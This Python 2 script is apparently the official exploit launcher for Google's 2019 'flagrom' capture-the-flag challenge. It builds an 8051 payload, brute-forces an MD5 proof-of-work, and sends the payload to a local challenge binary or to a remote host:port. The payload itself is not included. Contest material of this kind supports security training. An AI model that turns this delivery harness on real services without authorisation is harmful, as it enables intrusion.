#!/usr/bin/python
# Copyright 2019 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
import subprocess
import socket
import hashlib
import sys

def recvuntil(sock, txt):
  d = ""
  while d.find(txt) == -1:
    try:
      dnow = sock.recv(1)
      if len(dnow) == 0:
        return ("DISCONNECTED", d)
    except socket.timeout:
      return ("TIMEOUT", d)
    except socket.error as msg:
      return ("ERROR", d)
    d += dnow
  return ("OK", d)

def recvall(sock, n):
  d = ""
  while len(d) != n:
    try:
      dnow = sock.recv(n - len(d))
      if len(dnow) == 0:
        return ("DISCONNECTED", d)
    except socket.timeout:
      return ("TIMEOUT", d)
    except socket.error as msg:
      return ("ERROR", d)
    d += dnow
  return ("OK", d)

# Proxy object for sockets.
class gsocket(object):
  def __init__(self, *p):
    self._sock = socket.socket(*p)

  def __getattr__(self, name):
    return getattr(self._sock, name)

  def recvall(self, n):
    err, ret = recvall(self._sock, n)
    if err != "OK":
      return False
    return ret

  def recvuntil(self, txt):
    err, ret = recvuntil(self._sock, txt)
    if err != "OK":
      return False
    return ret

# Proxy object for pipes
class psocket(object):
  def __init__(self, pin, pout):
    self._pin = pin
    self._pout = pout

  def __getattr__(self, name):
    print "__getattr__:", name
    return None

  def recv(self, n):
    return self._pin.read(n)

  def send(self, n):
    return self._pout.write(n)

  def sendall(self, n):
    return self.send(n)

  def recvall(self, n):
    err, ret = recvall(self, n)
    if err != "OK":
      return False
    return ret

  def recvuntil(self, txt):
    err, ret = recvuntil(self, txt)
    if err != "OK":
      return False
    return ret

def prepare_payload():
  print "[ 8051 ] Compiling payload..."
  subprocess.check_call(["make", "-B"])
  with open("exploit.8051", "rb") as f:
    return f.read()

def test_local(payload):
  p = subprocess.Popen(["./flagrom"], cwd='..', stdin=subprocess.PIPE, stdout=subprocess.PIPE)
  send_payload(psocket(p.stdout, p.stdin), payload)
  stdoutdata, stderrdata = p.communicate()
  print stdoutdata
  print stderrdata

def get_pow(pow):
  sys.stdout.write("[ PoW  ] md5('flagrom-???') starts with '%s'... " % pow)
  sys.stdout.flush()
  pow = pow.decode("hex")
  for i in xrange(0xf000000):
    x = "flagrom-%i" % i
    if hashlib.md5(x).digest().startswith(pow):
      print x
      return x
  print "NOT FOUND"

def send_payload(s, payload):
  pow_line = s.recvuntil("?\n").strip()
  print "[ Recv ]", pow_line
  pow = pow_line.split(" ")[-1].replace("?", "")
  response = get_pow(pow)
  s.sendall("%s\n" % response)

  length_line = s.recvuntil("payload?\n").strip()
  print "[ Recv ]", length_line
  print "[ Len  ]", len(payload)
  s.sendall("%i\n" % len(payload))

  print "[ Send ] Sending payload...",
  sys.stdout.flush()
  s.sendall(payload)
  print "Sent!"

def test_remote(payload, addr):
  host, port = addr.split(':')
  s = gsocket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((host, int(port)))
  send_payload(s, payload)
  while True:
    ret = s.recv(1)
    if not ret:
      break
    sys.stdout.write(ret)
  s.close()

if len(sys.argv) == 1:
  print "[      ] Testing using stdin/out redirection!"
  print "[      ] (if you want to run this exploit remotly: ./exploit.py ip:port)"
  test_local(prepare_payload())
else:
  print "[      ] Testing remotly!"
  test_remote(prepare_payload(), sys.argv[1])

